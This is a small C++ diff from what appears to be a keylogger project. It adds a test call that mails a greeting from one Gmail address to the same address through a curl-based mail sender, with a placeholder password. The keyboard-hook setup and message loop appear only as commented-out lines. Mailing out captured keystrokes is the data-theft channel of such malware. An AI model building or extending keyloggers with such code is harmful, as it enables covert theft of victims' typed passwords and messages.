@@ -1,23 +1,29 @@
 #include <iostream>
-#include <Windows.h>
+
+#include "CurlMailSender.h"
 
 int main()
 {
-	//MSG message;
+    keylogger::mail::CurlMailSender mailSender;
+    keylogger::mail::Mail mail{
+        "michalovskyyy@gmail.com", "michalovskyyy@gmail.com",
+        "siema", "witam pana", {}};
+    keylogger::mail::Credentials credentials{"michalovskyyy@gmail.com", "xxx"};
+    return mailSender.sendMail(mail, credentials);
+    // MSG message;
 
-	//using namespace keylogger;
-	//FileSystemHandler::createDirectory(FileSystemHandler::getCurrentPath(true));
+    // using namespace keylogger;
+    // FileSystemHandler::createDirectory(FileSystemHandler::getCurrentPath(true));
 
-	//KeyboardHook hook;
+    // KeyboardHook hook;
 
-	//hook.installHook();
+    // hook.installHook();
 
-	//while (GetMessage(&message, nullptr, 0, 0))
-	//{
-	//	TranslateMessage(&message);
-	//	DispatchMessage(&message);
-	//}
+    // while (GetMessage(&message, nullptr, 0, 0))
+    //{
+    //	TranslateMessage(&message);
+    //	DispatchMessage(&message);
+    //}
 
-	//hook.uninstallHook();
-	return 0;
+    // hook.uninstallHook();
 }
